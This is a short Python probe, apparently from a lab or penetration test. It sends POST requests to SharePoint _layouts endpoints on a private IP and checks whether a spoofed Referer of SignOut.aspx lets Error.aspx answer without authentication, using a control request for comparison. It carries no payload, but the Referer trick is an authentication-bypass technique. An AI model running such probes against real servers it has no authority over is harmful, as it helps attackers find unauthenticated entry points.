# Verify if Error.aspx is truly bypassing auth or is publicly accessible
# Purpose: Distinguish between bypass and intentional public access

import requests

base_url = "http://10.10.10.166"
test_body = "test=data"

test_cases = [
    {
        "name": "Error.aspx WITH signout referer",
        "endpoint": "/_layouts/15/Error.aspx",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
            "Referer": "/_layouts/SignOut.aspx"
        }
    },
    {
        "name": "Error.aspx WITHOUT signout referer",
        "endpoint": "/_layouts/15/Error.aspx",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    },
    {
        "name": "Error.aspx with normal referer",
        "endpoint": "/_layouts/15/Error.aspx",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Referer": "/_layouts/Settings.aspx"
        }
    },
    {
        "name": "Settings.aspx WITHOUT referer (control)",
        "endpoint": "/_layouts/15/Settings.aspx",
        "headers": {
            "User-Agent": "Mozilla/5.0"
        }
    }
]

for test in test_cases:
    print(f"\n[*] Testing: {test['name']}")
    headers = test['headers'].copy()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    
    try:
        response = requests.post(f"{base_url}{test['endpoint']}", headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    Response snippet: {response.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
